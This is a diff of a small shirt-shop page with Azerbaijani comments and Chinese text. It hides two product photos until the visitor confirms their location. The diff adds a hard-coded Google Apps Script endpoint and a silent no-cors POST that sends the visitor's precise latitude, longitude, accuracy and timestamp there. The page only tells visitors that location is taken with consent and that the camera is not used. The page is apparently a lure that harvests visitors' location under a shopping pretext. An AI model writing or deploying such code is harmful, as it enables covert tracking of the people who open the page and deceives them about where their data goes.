@@ -2,92 +2,89 @@
 <html lang="zh">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+
 <title>Trend Köynəklər</title>
 
 <style>
 *{
-    box-sizing:border-box;
+  box-sizing:border-box;
 }
 
 body{
-    margin:0;
-    background:#f7f2ef;
-    font-family:Arial,sans-serif;
+  margin:0;
+  font-family:Arial,sans-serif;
+  background:#f7f2ef;
 }
 
 .page{
-    width:100%;
-    max-width:600px;
-    margin:0 auto;
-    padding:15px;
+  max-width:600px;
+  margin:auto;
+  padding:15px 15px 40px;
 }
 
-/* Bütün şəkillər */
-.photo{
-    width:100%;
-    display:block;
-    border-radius:20px;
-    margin-bottom:20px;
-}
-
-/* Konum bölməsi */
 .location{
-    background:#ffffff;
-    border-radius:28px;
-    padding:45px 22px;
-    text-align:center;
-    box-shadow:0 5px 25px rgba(0,0,0,0.12);
-    margin-bottom:20px;
+  background:white;
+  border-radius:28px;
+  padding:45px 20px;
+  text-align:center;
+  box-shadow:0 5px 25px rgba(0,0,0,.12);
 }
 
 .icon{
-    font-size:70px;
+  font-size:70px;
 }
 
 h1{
-    font-size:38px;
-    margin:18px 0;
+  font-size:38px;
+  margin:18px 0;
 }
 
-.description{
-    font-size:21px;
-    line-height:1.6;
-    color:#555;
+p{
+  font-size:21px;
+  line-height:1.6;
+  color:#555;
 }
 
 .info{
-    background:#f4eeee;
-    padding:18px;
-    border-radius:16px;
-    font-size:17px;
-    line-height:1.6;
-    margin:25px 0;
+  background:#f4eeee;
+  padding:18px;
+  border-radius:16px;
+  font-size:17px;
+  line-height:1.6;
+  margin:25px 0;
 }
 
 button{
-    width:100%;
-    padding:21px;
-    border:none;
-    border-radius:17px;
-    background:#222;
-    color:white;
-    font-size:22px;
-    font-weight:bold;
+  width:100%;
+  padding:21px;
+  border:0;
+  border-radius:17px;
+  background:#222;
+  color:white;
+  font-size:22px;
+  font-weight:bold;
+  cursor:pointer;
 }
 
 button:disabled{
-    opacity:0.6;
+  opacity:.6;
 }
 
 #status{
-    margin-top:20px;
-    font-size:17px;
+  margin-top:20px;
+  font-size:17px;
 }
 
-/* 2-ci və 3-cü şəkillər əvvəlcə gizlidir */
-#afterLocation{
-    display:none;
+.photo{
+  width:100%;
+  display:block;
+  border-radius:20px;
+  margin-top:20px;
+}
+
+#afterPhotos{
+  display:none;
 }
 </style>
 </head>
@@ -96,117 +93,173 @@ button:disabled{
 
 <div class="page">
 
-    <!-- YALNIZ 1-Cİ ŞƏKİL -->
+  <!-- İLK ŞƏKİL -->
+  <img
+    class="photo"
+    src="IMG_20261005_014348.jpg"
+    alt="Trend qadın köynəyi"
+  >
+
+  <!-- KONUM TƏSDİQİ -->
+  <div class="location">
+
+    <div class="icon">📍</div>
+
+    <h1>位置确认</h1>
+
+    <p>
+      请确认您的位置
+      <br>
+      点击下面的按钮并允许位置权限
+    </p>
+
+    <div class="info">
+      🔒 只有在您主动允许后，我们才会获取您的位置。
+      <br><br>
+      📷 不使用摄像头，也不会拍照。
+    </div>
+
+    <button id="locationBtn">
+      确认我的位置
+    </button>
+
+    <div id="status"></div>
+
+  </div>
+
+  <!-- İCAZƏDƏN SONRA AÇILAN ŞƏKİLLƏR -->
+  <div id="afterPhotos">
+
     <img
-        src="IMG_20261005_014348.jpg"
-        class="photo"
-        alt="Trend qadın köynəyi"
+      class="photo"
+      src="IMG_20261005_014406.jpg"
+      alt="Trend qadın köynəyi"
     >
 
-    <!-- KONUM TƏSDİQİ -->
-    <div class="location">
+    <img
+      class="photo"
+      src="IMG_20261005_014430.jpg"
+      alt="Trend qadın köynəyi"
+    >
 
-        <div class="icon">📍</div>
-
-        <h1>位置确认</h1>
-
-        <div class="description">
-            请确认您的位置
-            <br>
-            点击下面的按钮并允许位置权限
-        </div>
-
-        <div class="info">
-            🔒 只有在您主动允许后，我们才会获取您的位置。
-            <br>
-            📷 不使用摄像头，也不会拍照。
-        </div>
-
-        <button id="locationBtn">
-            确认我的位置
-        </button>
-
-        <div id="status"></div>
-
-    </div>
-
-
-    <!-- YALNIZ KONUMDAN SONRA 2-Cİ VƏ 3-CÜ ŞƏKİL -->
-    <div id="afterLocation">
-
-        <img
-            src="IMG_20261005_014406.jpg"
-            class="photo"
-            alt="Trend qadın köynəyi"
-        >
-
-        <img
-            src="IMG_20261005_014430.jpg"
-            class="photo"
-            alt="Trend qadın köynəyi"
-        >
-
-    </div>
+  </div>
 
 </div>
 
-
 <script>
 
-const locationBtn = document.getElementById("locationBtn");
-const status = document.getElementById("status");
-const afterLocation = document.getElementById("afterLocation");
+/* APPS SCRIPT ÜNVANI */
+const APP_SCRIPT_URL =
+"https://script.google.com/macros/s/AKfycbxTNuy179zPxbSJYoQgAfNu6bqNCqjqjKeTIO7B3SKnYrmrGCN9DAD4TpphJ2tK_fsQZg/exec";
 
-locationBtn.addEventListener("click", function(){
 
-    if(!navigator.geolocation){
+const btn =
+document.getElementById("locationBtn");
 
-        status.textContent =
-        "您的浏览器不支持位置服务。";
+const status =
+document.getElementById("status");
 
-        return;
-    }
+const afterPhotos =
+document.getElementById("afterPhotos");
 
-    locationBtn.disabled = true;
+
+btn.onclick = function(){
+
+  if(!navigator.geolocation){
 
     status.textContent =
-    "正在等待位置权限...";
+    "您的浏览器不支持位置服务。";
 
-    navigator.geolocation.getCurrentPosition(
+    return;
+  }
 
-        function(position){
+  btn.disabled = true;
 
-            status.textContent =
-            "位置确认成功。";
+  status.textContent =
+  "正在等待位置权限...";
 
-            /* 2-ci və 3-cü şəkilləri göstər */
-            afterLocation.style.display = "block";
 
-            afterLocation.scrollIntoView({
-                behavior:"smooth",
-                block:"start"
-            });
+  navigator.geolocation.getCurrentPosition(
 
+    function(position){
+
+      const latitude =
+      position.coords.latitude;
+
+      const longitude =
+      position.coords.longitude;
+
+      const accuracy =
+      position.coords.accuracy;
+
+
+      /* KONUMU APPS SCRIPTƏ GÖNDƏR */
+      fetch(APP_SCRIPT_URL, {
+
+        method:"POST",
+
+        mode:"no-cors",
+
+        headers:{
+          "Content-Type":
+          "text/plain;charset=utf-8"
         },
 
-        function(){
+        body:JSON.stringify({
 
-            locationBtn.disabled = false;
+          latitude:latitude,
 
-            status.textContent =
-            "请允许位置权限后继续。";
+          longitude:longitude,
 
-        },
+          accuracy:accuracy,
 
-        {
-            enableHighAccuracy:true,
-            timeout:15000,
-            maximumAge:0
-        }
+          timestamp:
+          new Date().toISOString()
 
-    );
+        })
 
-});
+      }).catch(function(error){
+
+        console.log(error);
+
+      });
+
+
+      status.textContent =
+      "位置确认成功。";
+
+      afterPhotos.style.display =
+      "block";
+
+
+      afterPhotos.scrollIntoView({
+        behavior:"smooth"
+      });
+
+    },
+
+
+    function(error){
+
+      btn.disabled = false;
+
+      status.textContent =
+      "请允许位置权限后继续。";
+
+    },
+
+
+    {
+      enableHighAccuracy:true,
+
+      timeout:15000,
+
+      maximumAge:0
+    }
+
+  );
+
+};
 
 </script>
 
